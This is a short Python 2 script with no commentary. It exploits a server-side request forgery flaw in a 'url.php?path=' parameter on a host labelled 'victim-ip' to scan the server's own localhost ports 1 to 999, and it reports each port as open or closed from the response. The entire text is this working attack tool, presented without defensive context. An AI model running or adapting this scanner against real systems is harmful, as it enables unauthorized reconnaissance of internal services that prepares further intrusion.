import urllib2

for port in range(1,1000):
	print "Checking port %s " %str(port)

	url = "http://victim-ip:victim-port/url.php?path=127.0.0.1:%s" %str(port)
	response = urllib2.urlopen(url).read().strip()
	if response != "":
		#print "Status : Open"
		print "Port %s is Open" %str(port)
		print response
		print "==================================================="

	else:
		print "Status : Closed"
		print "==================================================="
		


